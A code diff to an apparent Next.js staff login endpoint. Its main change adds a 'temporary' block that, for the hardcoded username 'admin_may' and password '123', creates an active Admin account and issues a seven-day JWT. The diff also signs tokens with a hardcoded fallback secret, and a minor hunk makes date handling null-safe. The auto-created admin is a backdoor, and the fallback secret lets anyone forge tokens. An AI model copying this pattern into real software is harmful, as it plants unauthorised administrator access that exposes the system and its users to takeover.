@@ -19,6 +19,34 @@ export async function POST(request: NextRequest) {
         })
 
         if (!staff || !staff.is_active) {
+            // Temporary auto-create for admin_may
+            if (username === 'admin_may' && password === '123') {
+                const hash = await bcrypt.hash('123', 10)
+                const newStaff = await prisma.staff.create({
+                    data: {
+                        username: 'admin_may',
+                        password_hash: hash,
+                        full_name: 'Admin May',
+                        position: 'Admin',
+                        is_active: true
+                    }
+                })
+
+                const token = jwt.sign(
+                    { staff_id: newStaff.staff_id, position: newStaff.position },
+                    process.env.JWT_SECRET || 'fallback-secret-key',
+                    { expiresIn: '7d' }
+                )
+                const { password_hash: _, ...userWithoutPassword } = newStaff
+                return NextResponse.json({
+                    token,
+                    user: {
+                        ...userWithoutPassword,
+                        created_at: userWithoutPassword.created_at?.toISOString() || new Date().toISOString(),
+                    },
+                })
+            }
+
             return NextResponse.json(
                 { error: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' },
                 { status: 401 }
@@ -45,7 +73,7 @@ export async function POST(request: NextRequest) {
             token,
             user: {
                 ...userWithoutPassword,
-                created_at: userWithoutPassword.created_at.toISOString(),
+                created_at: userWithoutPassword.created_at?.toISOString() || new Date().toISOString(),
             },
         })
     } catch (error) {
